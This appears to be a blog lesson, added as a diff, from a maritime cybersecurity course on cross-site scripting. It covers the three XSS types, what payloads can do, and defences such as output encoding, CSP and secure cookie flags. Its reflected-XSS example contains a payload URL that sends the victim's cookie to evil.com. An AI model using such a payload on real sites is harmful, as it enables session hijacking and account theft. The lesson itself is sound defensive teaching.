@@ -1,0 +1,209 @@
+<!--════════════════════════════════════════════════════════════
+     Series : Maritime Cybersecurity Learning Roadmap
+     Part   : PART 2 — Understanding Cyber Attacks
+     Lesson : 11 of 7 — Cross-Site Scripting (XSS)
+     Topics : Reflected XSS · Stored XSS · DOM-based XSS ·
+              Cookie Theft · Session Hijacking · CSP ·
+              Output Encoding · HTTPOnly & Secure Flags
+     Author : Captain Paul  |  ShipPaulJobs
+     Style  : Maritime 4.0 Design System
+════════════════════════════════════════════════════════════-->
+
+<div style="box-sizing:border-box;font-family:&quot;Segoe UI&quot;,&quot;Apple SD Gothic Neo&quot;,Arial,sans-serif;line-height:1.75;margin:0 auto;max-width:780px;">
+
+<!--══ SERIES NAV — TOP ══-->
+<div style="background:rgb(240,247,255);border-radius:10px;border:1px solid rgb(200,223,247);font-size:12px;margin-bottom:24px;padding:12px 18px;">
+  <span style="color:#6b8599;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;">📚 Series</span>
+  <span style="color:#4a6278;margin:0 6px;">Maritime Cybersecurity Learning Roadmap</span>
+  <span style="color:#c8dff7;">|</span>
+  <span style="background:rgb(21,79,122);border-radius:4px;color:white;font-size:10px;font-weight:700;margin:0 6px;padding:2px 8px;">PART 2</span>
+  <span style="color:#0a2342;font-weight:700;">Lesson 11 of 7</span>
+  <span style="color:#9fb5c2;margin:0 8px;">·</span>
+  <a href="https://www.shippauljobs.com/2026/09/maritime-cybersecurity-learning-roadmap.html" rel="noopener" style="color:#1a9e82;font-weight:600;text-decoration:none;" target="_blank">Course Index →</a>
+</div>
+
+<!--══ HERO HEADER ══-->
+<div style="background:linear-gradient(135deg,rgb(10,35,66) 0%,rgb(10,80,100) 55%,rgb(20,170,190) 100%);border-radius:16px;margin-bottom:28px;overflow:hidden;padding:40px 36px 32px;position:relative;">
+  <div style="background:rgba(255,255,255,0.04);border-radius:50%;height:260px;position:absolute;right:-60px;top:-60px;width:260px;"></div>
+  <div style="display:flex;flex-wrap:wrap;gap:7px;margin-bottom:18px;">
+    <span style="background:rgba(255,193,7,0.35);border-radius:20px;color:#ffe082;font-size:9px;font-weight:800;letter-spacing:1.4px;padding:3px 11px;text-transform:uppercase;">PART 2 · Lesson 11</span>
+    <span style="background:rgba(20,170,190,0.4);border-radius:20px;color:#a0f0ff;font-size:9px;font-weight:800;letter-spacing:1.4px;padding:3px 11px;text-transform:uppercase;">Injection</span>
+    <span style="background:rgba(255,255,255,0.13);border-radius:20px;color:#b8d4ea;font-size:9px;font-weight:800;letter-spacing:1.4px;padding:3px 11px;text-transform:uppercase;">XSS · Browser</span>
+  </div>
+  <h1 style="color:white;font-size:30px;font-weight:900;letter-spacing:-0.5px;line-height:1.25;margin:0 0 12px;">Cross-Site Scripting (XSS)</h1>
+  <p style="color:rgba(255,255,255,0.82);font-size:15px;line-height:1.75;margin:0 0 22px;">Reflected XSS · Stored XSS · DOM-based XSS · Cookie Theft · Session Hijacking · Content Security Policy · Output Encoding · Cookie Security Flags — script injection into trusted web pages that executes in a victim's browser.</p>
+  <div style="align-items:center;border-top:1px solid rgba(255,255,255,0.15);display:flex;flex-wrap:wrap;gap:18px;padding-top:18px;">
+    <div style="align-items:center;display:flex;gap:10px;">
+      <a href="https://www.linkedin.com/in/shipjobs/" rel="noopener" target="_blank">
+        <img alt="Captain Paul" loading="lazy" src="https://github.com/MaritimeCyber/General/blob/main/Asset/img/member/insung.jpeg?raw=true" style="border-radius:50%;border:1.5px solid rgba(255,255,255,0.4);flex-shrink:0;height:36px;object-fit:cover;width:36px;" />
+      </a>
+      <div>
+        <div style="color:white;font-size:13px;font-weight:700;line-height:1.3;">Captain Paul</div>
+        <div style="color:#9ab5c9;font-size:10px;">Maritime Cybersecurity · IACS UR E26/E27</div>
+      </div>
+    </div>
+    <div style="color:#9ab5c9;font-size:11px;margin-left:auto;">September 2026</div>
+  </div>
+</div>
+
+<!--══ LESSON OBJECTIVE ══-->
+<div style="background:rgb(235,252,255);border-left:4px solid rgb(20,170,190);border-radius:0 10px 10px 0;margin-bottom:28px;padding:18px 22px;">
+  <div style="color:#0a7a90;font-size:11px;font-weight:800;letter-spacing:0.1em;margin-bottom:8px;text-transform:uppercase;">🎯 Lesson Objective</div>
+  <p style="color:#2c3e50;font-size:14px;line-height:1.8;margin:0;">After this lesson you can explain what XSS is and why it differs from SQL Injection, describe the three XSS types (Reflected, Stored, DOM-based), explain how Stored XSS enables persistent session hijacking through cookie theft, explain the role of Content Security Policy (CSP) in blocking unauthorised scripts, and describe the HTTPOnly and Secure cookie flags as a key defence against cookie theft.</p>
+</div>
+
+<!--══ INTRO ══-->
+<div style="margin-bottom:32px;">
+  <p style="color:#354a5e;font-size:14.5px;line-height:1.9;margin:0 0 16px;">SQL Injection targets the server — it manipulates a database. Cross-Site Scripting (XSS) targets the user — it injects malicious JavaScript into a web page that executes in the victim's browser, in the context of the trusted site. Because the script runs from within the trusted domain, the browser does not treat it as foreign. The script has access to everything on the page: the DOM, stored cookies, session tokens, form inputs, and potentially the ability to make authenticated requests to the server.</p>
+  <p style="color:#354a5e;font-size:14.5px;line-height:1.9;margin:0 0 16px;">XSS has appeared on the OWASP Top 10 since the list's inception and remains one of the most prevalent web application vulnerabilities. Its popularity as an attack vector is driven by the ubiquity of web applications, the wide range of browser APIs accessible to injected scripts, and the fact that the attack is invisible to the victim — they see no indication that a script is exfiltrating their session cookie to a remote server.</p>
+  <p style="color:#354a5e;font-size:14.5px;line-height:1.9;margin:0;">The root cause mirrors SQL Injection: user-supplied content is rendered in a page without proper encoding, allowing the browser to interpret it as HTML and JavaScript rather than as text. The fix is equally clear: encode all output before rendering it in a browser context. And like SQLi, the vulnerability persists because it is not always obvious which data paths require encoding and because legacy codebases often predate awareness of the issue.</p>
+</div>
+
+<!--══ SECTION 1: XSS TYPES ══-->
+<div style="margin-bottom:32px;">
+  <div style="align-items:center;display:flex;gap:10px;margin-bottom:14px;">
+    <div style="background:linear-gradient(rgb(10,35,66),rgb(10,80,100));border-radius:2px;flex-shrink:0;height:26px;width:4px;"></div>
+    <h2 style="color:#0a2342;font-size:19px;font-weight:800;margin:0;">1. The Three Types of Cross-Site Scripting</h2>
+  </div>
+  <div style="display:flex;flex-direction:column;gap:14px;margin-bottom:8px;">
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 20px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">🔁 Reflected XSS (Non-Persistent)</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">The malicious script is embedded in a URL parameter. When the victim clicks the crafted URL, the server includes the parameter's value in the HTML response — without encoding it — and the browser executes it. The script exists only in the URL; it is not stored anywhere on the server.</p>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;"><strong>Example attack chain:</strong> Attacker crafts a URL to a vulnerable search page: <code style="background:#f0faff;border-radius:3px;font-size:11.5px;padding:1px 5px;">https://portal.example.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code> — the victim clicks the link (delivered via email or social media), the script fires in their browser, and their session cookie is sent to the attacker's server.</p>
+      <div style="background:#e8faff;border-radius:6px;color:#0a7a90;font-size:11.5px;padding:8px 10px;"><strong>Delivery:</strong> Typically via phishing emails, malicious links in messages, or crafted URLs shared in forums or documents.</div>
+    </div>
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 20px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">💾 Stored XSS (Persistent)</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">The malicious script is stored permanently in the server's database — in a comment field, a message, a profile description, a vessel name, or any user-submitted content that is later retrieved and displayed to other users. Every user who views the page containing the stored script becomes a victim. No interaction beyond visiting the page is required.</p>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;"><strong>Why it is more dangerous:</strong> Stored XSS does not require social engineering to deliver. An attacker who gains access to any input field that persists data can attack every subsequent visitor — potentially including administrators, whose elevated session tokens are of particular value. A single injected payload in a fleet management portal's vessel name field or crew comment section could persist until the database is cleansed.</p>
+      <div style="background:#e8faff;border-radius:6px;color:#0a7a90;font-size:11.5px;padding:8px 10px;"><strong>Maritime example:</strong> An attacker with access to a vessel record updates a comments field with an XSS payload. Every fleet manager who views the vessel details page is silently compromised.</div>
+    </div>
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 20px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">🔧 DOM-based XSS</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">The vulnerability exists entirely in client-side JavaScript. The page's own JavaScript reads an attacker-controlled value (from the URL hash, a query parameter, or document.referrer) and writes it into the DOM without encoding. The server sends a perfectly safe response — the malicious script is constructed by the browser itself from the attacker-controlled source. DOM-based XSS is particularly difficult to detect with server-side scanners because the vulnerability is invisible in server responses.</p>
+      <div style="background:#e8faff;border-radius:6px;color:#0a7a90;font-size:11.5px;padding:8px 10px;"><strong>Common source:</strong> Single-page applications (SPAs) that use <code style="font-size:11px;">location.hash</code> or <code style="font-size:11px;">URLSearchParams</code> values to render page content without encoding.</div>
+    </div>
+  </div>
+</div>
+
+<!--══ SECTION 2: WHAT A PAYLOAD CAN DO ══-->
+<div style="margin-bottom:32px;">
+  <div style="align-items:center;display:flex;gap:10px;margin-bottom:14px;">
+    <div style="background:linear-gradient(rgb(10,80,100),rgb(20,170,190));border-radius:2px;flex-shrink:0;height:26px;width:4px;"></div>
+    <h2 style="color:#0a2342;font-size:19px;font-weight:800;margin:0;">2. What an XSS Payload Can Do</h2>
+  </div>
+  <div style="background:white;border:1px solid #d1e0ee;border-radius:12px;overflow:hidden;">
+    <div style="background:rgb(10,80,100);color:#a0f0ff;font-size:11px;font-weight:800;letter-spacing:0.1em;padding:10px 18px;text-transform:uppercase;">XSS Payload Capabilities — Same Origin Context</div>
+    <div style="padding:0 18px 4px;">
+      <table style="border-collapse:collapse;font-size:13px;width:100%;">
+        <tbody>
+          <tr style="border-bottom:1px solid #f0f4f8;">
+            <td style="color:#0a7a90;font-weight:700;padding:9px 12px 9px 0;vertical-align:top;white-space:nowrap;">Cookie Theft</td>
+            <td style="color:#4a6278;padding:9px 0 9px 12px;vertical-align:top;"><code style="font-size:11.5px;">document.cookie</code> exposes all non-HttpOnly cookies for the domain. A payload sending this to an attacker's server provides the session token — allowing the attacker to authenticate as the victim from a different machine without knowing the password.</td>
+          </tr>
+          <tr style="border-bottom:1px solid #f0f4f8;">
+            <td style="color:#0a7a90;font-weight:700;padding:9px 12px 9px 0;vertical-align:top;">Keylogging</td>
+            <td style="color:#4a6278;padding:9px 0 9px 12px;vertical-align:top;">An injected script can attach an event listener to every keypress on the page and exfiltrate the user's input — capturing credentials typed into login forms after the session is already established, or during a re-authentication prompt.</td>
+          </tr>
+          <tr style="border-bottom:1px solid #f0f4f8;">
+            <td style="color:#0a7a90;font-weight:700;padding:9px 12px 9px 0;vertical-align:top;">Credential Phishing</td>
+            <td style="color:#4a6278;padding:9px 0 9px 12px;vertical-align:top;">The script can overlay a fake login form over the legitimate page, asking the user to re-enter credentials. Because the URL remains the legitimate site's domain, the user has no visual reason to distrust the prompt.</td>
+          </tr>
+          <tr style="border-bottom:1px solid #f0f4f8;">
+            <td style="color:#0a7a90;font-weight:700;padding:9px 12px 9px 0;vertical-align:top;">Account Takeover</td>
+            <td style="color:#4a6278;padding:9px 0 9px 12px;vertical-align:top;">With a valid session token (from cookie theft), the attacker can make authenticated API calls — changing the victim's email address, exfiltrating data, or performing administrative actions if the victim is an admin.</td>
+          </tr>
+          <tr>
+            <td style="color:#0a7a90;font-weight:700;padding:9px 12px 9px 0;vertical-align:top;">CSRF Token Bypass</td>
+            <td style="color:#4a6278;padding:9px 0 9px 12px;vertical-align:top;">XSS breaks the CSRF defences of the same application — the script can read the CSRF token from the DOM and use it to forge authenticated requests, bypassing the primary defence against Cross-Site Request Forgery.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!--══ SECTION 3: DEFENCES ══-->
+<div style="margin-bottom:28px;">
+  <div style="align-items:center;display:flex;gap:10px;margin-bottom:14px;">
+    <div style="background:linear-gradient(rgb(10,35,66),rgb(26,158,130));border-radius:2px;flex-shrink:0;height:26px;width:4px;"></div>
+    <h2 style="color:#0a2342;font-size:19px;font-weight:800;margin:0;">3. Defences — How to Prevent XSS</h2>
+  </div>
+  <div style="display:grid;gap:14px;grid-template-columns:1fr 1fr;margin-bottom:4px;">
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 18px 14px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">📝 Output Encoding</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">The primary defence. Before any user-supplied data is rendered in an HTML page, it must be HTML-encoded so that special characters are converted to their safe representation: <code style="font-size:11.5px;">&lt;</code> becomes <code style="font-size:11.5px;">&amp;lt;</code>, <code style="font-size:11.5px;">&gt;</code> becomes <code style="font-size:11.5px;">&amp;gt;</code>, and so on. The browser renders these as text characters, never as HTML tags or script elements. Context-aware encoding must be applied — HTML encoding, JavaScript encoding, and URL encoding are different and context-specific.</p>
+    </div>
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 18px 14px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">🛡️ Content Security Policy (CSP)</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">CSP is an HTTP response header that tells the browser which script sources it is allowed to execute. A properly configured CSP blocks all inline scripts (<code style="font-size:11.5px;">&lt;script&gt;</code> tags injected via XSS) and limits external scripts to approved domains. Even if an XSS vulnerability exists, CSP prevents the injected script from executing. A strict CSP is one of the most effective compensating controls against XSS exploitation.</p>
+    </div>
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 18px 14px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">🍪 HTTPOnly Cookie Flag</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">Setting the <code style="font-size:11.5px;">HttpOnly</code> flag on session cookies prevents JavaScript from accessing them — <code style="font-size:11.5px;">document.cookie</code> will not include HttpOnly cookies. This eliminates the most common XSS payload objective: cookie theft. The attacker can still perform actions in the browser context, but cannot extract the session token to authenticate from another machine.</p>
+    </div>
+    <div style="background:white;border:1.5px solid #9fd4e0;border-radius:12px;padding:18px 18px 14px;">
+      <h3 style="color:#0a2342;font-size:14px;font-weight:800;margin:0 0 10px;">🔐 Secure Cookie Flag & SameSite</h3>
+      <p style="color:#4a6278;font-size:13px;line-height:1.75;margin:0 0 10px;">The <code style="font-size:11.5px;">Secure</code> flag ensures cookies are only sent over HTTPS connections, preventing interception on unencrypted channels. The <code style="font-size:11.5px;">SameSite</code> attribute (<code style="font-size:11.5px;">Strict</code> or <code style="font-size:11.5px;">Lax</code>) controls whether cookies are sent with cross-site requests, reducing the risk of Cross-Site Request Forgery (CSRF) and some XSS-assisted attacks.</p>
+    </div>
+  </div>
+</div>
+
+<!--══ AUTHOR INSIGHT ══-->
+<div style="background:linear-gradient(135deg,#0a1e35,#091f30);border-radius:14px;margin-bottom:28px;padding:24px 26px;position:relative;overflow:hidden;">
+  <div style="background:rgba(20,170,190,0.07);border-radius:50%;height:180px;position:absolute;right:-40px;top:-40px;width:180px;"></div>
+  <div style="align-items:center;display:flex;gap:14px;margin-bottom:16px;">
+    <a href="https://www.linkedin.com/in/shipjobs/" rel="noopener" target="_blank">
+      <img alt="Captain Paul" loading="lazy" src="https://github.com/MaritimeCyber/General/blob/main/Asset/img/member/insung.jpeg?raw=true" style="border:2px solid rgba(20,170,190,0.6);border-radius:50%;flex-shrink:0;height:46px;object-fit:cover;width:46px;" />
+    </a>
+    <div>
+      <div style="color:#a0f0ff;font-size:11px;font-weight:800;letter-spacing:0.1em;text-transform:uppercase;">✍️ Author Insight — From the Field</div>
+      <div style="color:#9ab5c9;font-size:11px;margin-top:2px;">Captain Paul · Maritime Cybersecurity Consultant · IACS UR E26/E27</div>
+    </div>
+  </div>
+  <p style="color:rgba(255,255,255,0.88);font-size:14px;line-height:1.9;margin:0 0 14px;">During E26 CRSI assessments, XSS findings are encountered in maritime web portals more often than many operators expect. The typical scenario involves web applications built on top of relational databases containing crew and vessel data, where user-supplied text fields — vessel remarks, crew comments, notification messages — are stored and rendered back to administrators without HTML encoding.</p>
+  <p style="color:rgba(255,255,255,0.88);font-size:14px;line-height:1.9;margin:0 0 14px;">The most consequential variant observed is Stored XSS targeting administrative users. An attacker who can submit a comment or record update through a lower-privilege account can potentially compromise an administrative session that later views the same data. Given that administrative accounts in fleet management systems often have access to the full crew database, vessel compliance records, and system configuration, the resulting impact can be far disproportionate to the initial access level required.</p>
+  <p style="color:rgba(255,255,255,0.78);font-size:13.5px;line-height:1.85;margin:0;"><strong style="color:#a0f0ff;">Quick validation test:</strong> Enter <code style="background:rgba(255,255,255,0.1);border-radius:4px;font-size:11.5px;padding:1px 5px;">&lt;b&gt;test&lt;/b&gt;</code> in any text field that is displayed back to users. If the word "test" appears in bold in the rendered page, the application is not encoding output and is likely vulnerable to XSS. This single test — taking under ten seconds — is sufficient to identify the vulnerability class and justify escalation.</p>
+</div>
+
+<!--══ KEY TAKEAWAYS ══-->
+<div style="background:#ebfcff;border:1.5px solid #9fd4e0;border-radius:12px;margin-bottom:20px;padding:20px 22px;">
+  <div style="color:#0a7a90;font-size:11px;font-weight:800;letter-spacing:0.1em;margin-bottom:12px;text-transform:uppercase;">✅ Key Takeaways — Lesson 11</div>
+  <ul style="color:#2c3e50;font-size:13.5px;line-height:1.85;margin:0;padding-left:18px;">
+    <li>XSS injects malicious JavaScript into a trusted web page, which executes in the victim's browser with the page's full DOM access.</li>
+    <li>Reflected XSS is delivered via crafted URLs; Stored XSS persists in the server database and attacks every visitor; DOM-based XSS exists entirely in client-side JavaScript.</li>
+    <li>The most common XSS objective is cookie theft — stealing the session token to authenticate as the victim without needing a password.</li>
+    <li>Output encoding (HTML-encoding all user-supplied data before rendering) is the primary defence.</li>
+    <li>The HTTPOnly cookie flag prevents JavaScript from reading session cookies, eliminating cookie theft even when XSS is present.</li>
+    <li>Content Security Policy (CSP) prevents injected scripts from executing — a critical compensating control for applications where encoding all outputs is complex.</li>
+    <li>A quick test: enter <code style="background:#f0faff;font-size:12px;padding:1px 4px;">&lt;b&gt;test&lt;/b&gt;</code> in input fields and check if "test" renders bold. Bold output means no output encoding.</li>
+  </ul>
+</div>
+
+<!--══ WHAT'S NEXT ══-->
+<div style="background:white;border:1.5px solid #d1e0ee;border-radius:12px;margin-bottom:28px;padding:18px 22px;">
+  <div style="color:#154f7a;font-size:11px;font-weight:800;letter-spacing:0.1em;margin-bottom:10px;text-transform:uppercase;">▶ Next — Lesson 12</div>
+  <p style="color:#354a5e;font-size:13.5px;line-height:1.8;margin:0 0 10px;"><strong>Lesson 12 — DNS Spoofing &amp; DNS-based Attacks</strong> closes PART 2 by examining the Domain Name System — the internet's phone book — and how attackers manipulate DNS to redirect traffic, intercept communications, and launch cache poisoning attacks. We also cover DNS over HTTPS/TLS and how maritime vessels are affected by DNS manipulation through satellite channels.</p>
+</div>
+
+<!--══ SERIES NAV — BOTTOM ══-->
+<div style="background:#f4f9ff;border:1.5px solid #d1e0ee;border-radius:12px;padding:18px 22px;">
+  <div style="color:#6b8599;font-size:11px;font-weight:800;letter-spacing:0.1em;margin-bottom:12px;text-transform:uppercase;">📚 PART 2 — Understanding Cyber Attacks</div>
+  <div style="display:flex;flex-direction:column;gap:6px;">
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#4a6278;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#9fb5c2;font-size:10px;font-weight:700;white-space:nowrap;">Done</span><span>Lesson 6 — Phishing &amp; Social Engineering</span></div>
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#4a6278;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#9fb5c2;font-size:10px;font-weight:700;white-space:nowrap;">Done</span><span>Lesson 7 — Ransomware &amp; the Cyber Kill Chain</span></div>
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#4a6278;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#9fb5c2;font-size:10px;font-weight:700;white-space:nowrap;">Done</span><span>Lesson 8 — DoS and DDoS Attacks</span></div>
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#4a6278;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#9fb5c2;font-size:10px;font-weight:700;white-space:nowrap;">Done</span><span>Lesson 9 — Man-in-the-Middle (MitM) Attacks</span></div>
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#4a6278;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#9fb5c2;font-size:10px;font-weight:700;white-space:nowrap;">Done</span><span>Lesson 10 — SQL Injection</span></div>
+    <div style="align-items:center;background:#0a2342;border-radius:6px;display:flex;gap:10px;padding:9px 14px;">
+      <span style="background:#0a7a90;border-radius:4px;color:#fff;font-size:10px;font-weight:800;padding:2px 8px;white-space:nowrap;">Current</span>
+      <span style="color:#fff;font-size:13px;font-weight:700;">Lesson 11 — Cross-Site Scripting (XSS)</span>
+    </div>
+    <div style="align-items:center;background:#f0f7ff;border-radius:6px;color:#9fb5c2;display:flex;gap:10px;font-size:13px;padding:9px 14px;"><span style="color:#c8d8e4;font-size:10px;font-weight:700;white-space:nowrap;">Next</span><span>Lesson 12 — DNS Spoofing &amp; DNS-based Attacks</span></div>
+  </div>
+  <div style="border-top:1px solid #d1e0ee;margin-top:14px;padding-top:12px;text-align:center;">
+    <a href="https://www.shippauljobs.com/2026/09/maritime-cybersecurity-learning-roadmap.html" rel="noopener" style="color:#1a9e82;font-size:13px;font-weight:700;text-decoration:none;" target="_blank">← View Full Course Index</a>
+  </div>
+</div>
+
+</div>
